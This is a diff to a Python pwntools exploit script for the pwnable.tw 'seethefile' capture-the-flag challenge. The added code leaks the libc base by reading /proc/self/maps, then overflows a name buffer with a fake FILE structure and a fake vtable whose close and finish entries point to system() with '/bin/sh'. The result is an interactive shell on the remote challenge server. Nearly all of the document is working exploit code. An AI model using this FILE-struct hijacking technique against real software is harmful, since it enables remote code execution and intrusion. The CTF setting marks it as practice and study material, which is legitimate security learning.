@@ -48,24 +48,68 @@ def exploit():
 	atoi_plt = 0x080485D0
 	strstr_got = 0x0804B00C
 
-	openfile('/etc/passwd')
+	# libc leak
+	openfile('/proc/self/maps')
+	readfile()
+	readfile()
+	re = writefile()
+	start = re.find('[heap]') + 7
+	re = re[start : start+8]
+	libc_base = int(re, 16)
+	log.info('libc_base : '+hex(libc_base))
+	if debug:
+		system_addr = libc_base + 0x3d200
+	else:
+		system_addr = libc_base + 0x3a940
 
-	stack_buf = '5...'
+	# stack leak
+	# readfile()
+	# readfile()
+	# re = writefile()
+	# re_li = re.split('\n')
+	# for i in re_li:
+	# 	if 'stack' in i:
+	# 		re = i[:8]
+	# 		break
+	# stack_base = int(re, 16)
+	# log.info('stack_base : '+hex(stack_base))
+
+	# exploit
+	## fake FILE struct
+	# esp_main = stack_base + 0x1f000
+	# fake_vtable = esp_main + 0xc + 8 - 4 * 17
+	# fake_io_struct = esp_main + 0xc + + 4
+
+	name = 0x0804B260
+	fake_io_addr = name + 0x20 + 4
+
+	fake_struct = '/bin/sh;'					# fake _io_struct
+	fake_struct += 'c' * (0x48 - len(fake_struct))
+	fake_struct += p32(fake_io_addr + 0x200)	# fake _io_struct, (pointer to null)
+	fake_struct += 'd' * (0x94 - len(fake_struct))
+	fake_struct += p32(fake_io_addr + len(fake_struct) + 4)
+
+	fake_vtable = p32(0) * 2
+	fake_vtable += p32(system_addr)				# fake vtable, fake _io_finish()
+	fake_vtable += '\x00' * (0x44 - len(fake_vtable))
+	fake_vtable += p32(system_addr)				# fake vtable, fake _io_close()
 
 	payload = 'a' * 0x20
+	payload += p32(fake_io_addr)
+	payload += fake_struct
+	payload += fake_vtable
 
-	etc(payload, stack_buf)
+	etc(payload)
 
-	openfile('/etc/passwd')
-	readfile()
-	print writefile()
+if __name__ == '__main__':
 
-if debug:
-    s = process('./seethefile')
-    pause()
-else:
-    s = remote('chall.pwnable.tw', 10200)
+	if debug:
+		#s = process("./seethefile")
+		s = process(['./seethefile'], env={'LD_PRELOAD':'./libc_32.so.6'})
+		pause()
+	else:
+	    s = remote('chall.pwnable.tw', 10200)
 
-exploit()
-s.interactive()
-s.close()
+	exploit()
+	s.interactive()
+	s.close()
